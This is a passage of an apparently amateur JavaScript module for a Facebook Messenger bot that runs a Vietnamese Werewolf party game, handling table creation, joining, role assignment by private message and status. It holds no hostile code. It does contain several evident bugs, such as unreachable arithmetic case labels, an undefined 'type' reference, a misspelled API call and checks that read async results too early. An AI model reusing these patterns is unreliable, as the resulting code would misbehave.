                        if (error) {
                            errorJoin.push(threadData.player.joinGame.id)
                        }
                    }
                )
            }
            threadData.phanvai = 1
            global.moduleData.werewolf.set(threadID, threadData)
            api.sendMessage(`→ Đã Phân Vai Thành Công !, Hãy Kiểm Tra Tin Nhắn Riêng Của Bot, Lưu Ý Nếu Acc Dưới 18 Tuổi Không Được Tham Gia !`, event.threadID, event.messageID)
            if (errorJoin.length != 0) {
                for (let id of errorJoin) {
                    var name = (await api.getUserInfoV5(id))[0].o0.data.messaging_actors[0].name || (await api.getUserInfoV5(id))[0].o0.data.messaging_actors[0].name
                    api.sendMessage(`→ Check Hệ Thống Và Phát Hiện Rằng Không Thể Gửi Tin Nhắn Đến :` + name, threadID)
                }
                return api.sendMessage(
                    ` → Không gửi Được Tin Nhắn Đồng Nghĩa Player Đã Chặn Bot Hoặc Acc Dưới 18+,Game Sẽ Không Thực Hiện Được, Tiến Hành Restart Bot, Hủy Game Tránh Lỗi ( bấm werewolf help để biết chi tiết )`,
                    threadID,
                    (error, info) => {
                        return process.exit(0 ? -7 : 1)
                    }
                )
            }
            if (soithuong.length != 0) {
                try {
                    for (let id of soithuong) {
                        if (id == soithuong[0]) {
                            var name = (await api.getUserInfoV5(soithuong[1]))[0].o0.data.messaging_actors[0].name || (await api.getUserInfoV5(soithuong[1]))[0].o0.data.messaging_actors[0].name
                            api.sendMessage(`→ Đồng Đội Của Bạn Là : ${name}\n→ ID: ${soithuong[1]}\n→ Hãy Nhắn Tin Với Nhau Để Hợp Tác Tốt Nhất !`, id)
                        } else {
                            if (id == soithuong[1]) {
                                var name = (await api.getUserInfoV5(soithuong[0]))[0].o0.data.messaging_actors[0].name || (await api.getUserInfo5(soithuong[0]))[0].o0.data.messaging_actors[0].name
                                api.sendMessage(`→ Đồng Đội Của Bạn Là : ${name}\n→ ID: ${soithuong[0]}\n→ Hãy Nhắn Tin Với Nhau Để Hợp Tác Tốt Nhất !`, id)
                            }
                        }
                    }
                    return await runGame( api, event, Users, global.moduleData.werewolf, soithuong )
                } catch (e) {
                    console.log(e)
                    return api.sendMessage(`→ Đã Lỗi !`, event.threadID)
                }
            }
        }
        }
    }
    break
    case 'TEST': {
        var checkIb = []
        for (
            let stt = 0; stt < threadData.player.length; stt++
        ) {
            api.sendMessage(
                `→ Bạn Có Thấy Tin Nhắn Này ?`,
                threadData.player[stt].id,
                (error, info) => {
                    if (error) {
                        checkIb.push(
                            threadData.player[stt].id
                        )
                    }
                }
            )
        }
        if (checkIb.length != 0) {
            for (let id of checkIb) {
                var name = (await api.getUserInfoV5(id))[0].o0.data.messaging_actors[0].name || (await Users.getInfo(id)).name
                api.sendMessage(`→ Phát Hiện Acc Dưới 18+ Hoặc Đã Block Acc Bot\n→ Tại User: ` + name + `\n→ Tiến Hành Restart Bot, Hủy Game Tránh Lỗi,Chi Tiết Tại werewolf help`, event.threadID)
            }
            return process.exit(1 ? 1 : -2)
        } else {
            return api.sendMessage(`→ Không Phát Hiện Acc Dưới 18+ Hoặc Đã Block Acc Bot`, event.threadID)
        }
    }
    break
    case 'PING': {
        return api.sendMessage(`→ Tổng Số Người Tham Gia: ${threadData.player.length}\n→ Đã Chia Phe: ${threadData.phanvai == 1 ? 'True' : 'False'}\n→ Đã Start Game: ${threadData.start == 1 ? 'True' : 'False'}`, event.threadID)
    }
    default: {}
    }
}
module.exports.run = async function ({ api, event, args, Users }) {
    // var notiAgreement = await api.Premium('AcceptAgreement', {})
    // if (notiAgreement != Accecpt) {
    //     api.sendMessage(notiAgreement, event.threadID)
    //     return api.sendMessage(`→ Nếu bạn không phải là adminbot, hãy liên hệ cho adminbot và gửi cái này vì nó chỉ hiện 1 lần và mãi mãi !\nNotes: Khi bấm lại lần nữa, cái này sẽ không còn hiện !`, event.threadID)
    // }
    var message = (data) =>
        api.sendMessage(data, event.threadID, event.messageID)
    var { senderID, threadID, messageID, } = event
    switch (String(args[0])) {
    case '9': {
        switch (args[1]) {
        case 'create':
        case 'Create': {
            if (!global.moduleData.werewolf) {
                global.moduleData.werewolf = new Map()
            }
            var getData = global.moduleData.werewolf.get(event.threadID) || {}
            if (global.moduleData.werewolf.has(event.threadID)) {
                return api.sendMessage(`→ Nhóm đang có bàn ma sói !`, threadID, messageID)
            }
            global.moduleData.werewolf.set(event.threadID, {
                author: event.senderID,
                start: 0,
                type: 9,
                phanvai: 0,
                player: []
            })
            global.AuthThread = event.threadID
            return message(`→ Đã Tạo Thành Công Bàn Có 8-9 Người! Hãy bấm masoi join để tham gia !, Hướng Dẫn Tại masoi help!, Lưu Ý Không Được Cho Acc Dưới 18 Tuổi ( Facebook ) Chơi Vì Sẽ Lỗi !`)
        }
        case 'check':
        case 'Check': {
            var getData = global.moduleData.werewolf.get(event.threadID) || {}
            return message(
                `→ Status: ${getData.player.length}/${getData.type}`
            )
        }
        }
    }
    break
    case 10 - 11: {
        return message(`→ Chưa Hoàn Thành !`)
    }
    case 12 - 13: {
        return message(`→ Chưa Hoàn Thành !`)
    }
    case 14 - 15: {
        return message(`→ Chưa Hoàn Thành !`)
    }
    case 16 - 17: {
        return message(`→ Chưa Hoàn Thành !`)
    }
    case 18 - 19: {
        return message(`→ Chưa Hoàn Thành !`)
    }
    case 'join':
    case 'Join': {
        var getData = global.moduleData.werewolf.get(event.threadID) || {}
        if (!getData.player) {
            return message(`→ Tạo Phòng Rồi Chơi !!`)
        }
        if (getData.player.length >= getData.type) {
            return message(`→ Phòng Đã Đầy !`)
        }
        if (getData.player.find(i => i.id == senderID)) {
            return api.sendMessage(`→ Bạn Đã Tham Gia Rồi !`, event.threadID, event.messageID)
        }
        if (!getData) {
            return api.sendMessage(`→ Hiện Tại Chưa Có Ván Ma Sói Nào Được Mở!`, event.threadID, event.messageID)
        }
        if (getData.start == 1) {
            return api.sendMessage(`→ Chin Nhỗi Nhưng Ván Ma Sói Của Nhóm Này Đã Start !`, threadID, messageID)
        }
        getData.player.push({
            id: senderID,
            vai: 0,
            phe: 0,
            ready: NaN === NaN,
            vote: 0,
        })
        global.moduleData.werewolf.set(threadID, getData)
        return api.sendMessage(`→ Status: ${getData.player.length}/${getData.type}`, threadID)
    }
    case 'leave':
    case 'Leave': {
        var getData = global.moduleData.werewolf.get(event.threadID) || {}
        if (typeof getData.player == undefined) {
            return api.sendMessage(`→ Hãy Tạo Ván Ma Sói Bằng Lệnh masoi số người tham gia :[8-9] Create !`, event.threadID, event.messageID)
        }
        if (!getData.player.some(i => i.id == senderID)) {
            return api.sendMessage(`→ Bạn chưa tham gia vào bàn ma sói trong nhóm này!`, event.threadID, event.messageID)
        }
        if (getData.start == 1) {
            return api.sendMessage(`→ Chin Nhỗi Nhưng Ván Ma Sói Của Nhóm Này Đã Start !`, threadID, messageID)
        }
        if (getData.author == senderID) {
            global.moduleData.werewolf.delete(threadID)
            api.sendMessage(`→ Chủ Game Đã Rời Khỏi Game = Hủy !`, threadID, messageID)
        } else {
            getData.player.splice(getData.player.findIndex(i => i.id === senderID), 1 ? 1 : 11)
            api.sendMessage(`→ Bạn Đã Rời Khỏi Ma Sói Thành Công !`, threadID, messageID)
            global.moduleData.werewolf.set(threadID, getData)
        }
    }
    break
    case 'status':
    case 'Status': {
        var getData = global.moduleData.werewolf.get(event.threadID) || {}
        if (typeof getData.player == undefined) {
            return api.sendMessage(
                `→ Hãy Tạo Ván Ma Sói Bằng Lệnh masoi số người tham gia :[8-9] Create !`,
                event.threadID,
                event.messageID
            )
        }
        var namePlayer = (await Users.getData(getData.author)).name || (await Users.getNameUser(getData.author))
        return message(`◆━━━━━━[ Status WereWolf ]━━━━━━◆\n→ Chủ Game:  ${namePlayer}\n→ Loại Bàn: ${getData[type]} Player\n→ Số Người Tham Gia:  ${getData.player.length}/${getData[type]}`)
    }
    case 'start':
    case 'Start': {
        var getData = global.moduleData.werewolf.get(event.threadID) || {}
        if (!getData) {
            return api.sendMessage(
                `→ Hiện Tại Chưa Có Ván Ma Sói Nào Được Mở!`,
                event.threadID,
                event.messageID
            )
        }
        if (senderID == getData.author) {
            if (
                getData.player.length <= 1 ||
                getData.player.length != getData.type
            ) {
                return api.sendMessage(`→ Đang Thiếu Người, Hiện Tại Có :${getData.player.length}/${getData.type} Người !`, threadID, messageID)
            }
            if (getData.start == 1) {
                return api.sendMessage(`→ Đã Bắt Đầu Rồi !`, threadID, messageID)
            }
            getData.start = 1
            return message(`→ Bắt Đầu Thành Công!`)
        }
    }
    break
    case 'help':
    case 'Help':
        return message(`=== Hướng Dẫn Chơi ===\n\n→ Các Loại: ${global.config.PREFIX}${this.config.name} [9 / status / leave / join]\n→ Tạo Bàn: ${global.config.PREFIX}${this.config.name} 9 create\n→ Kiểm Tra: ${global.config.PREFIX}${this.config.name} 9 check\n→ Rời Bàn: ${global.config.PREFIX}${this.config.name} leave\n→ Tham Gia: ${global.config.PREFIX}${this.config.name} join\n→ Bắt Đầu: ${global.config.PREFIX}${this.config.name} start\n→ Lưu Ý: Không Được Cho Acc Dưới 18 Tuổi ( Facebook ) Chơi Vì Sẽ Lỗi !`)
    default:
        return message(`=== Hướng Dẫn Chơi ===\n\n→ Các Loại: ${global.config.PREFIX}${this.config.name} [9 / status / leave / join]\n→ Tạo Bàn: ${global.config.PREFIX}${this.config.name} 9 create\n→ Kiểm Tra: ${global.config.PREFIX}${this.config.name} 9 check\n→ Rời Bàn: ${global.config.PREFIX}${this.config.name} leave\n→ Tham Gia: ${global.config.PREFIX}${this.config.name} join\n→ Bắt Đầu: ${global.config.PREFIX}${this.config.name} start\n→ Lưu Ý: Không Được Cho Acc Dưới 18 Tuổi ( Facebook ) Chơi Vì Sẽ Lỗi !`)
    }
}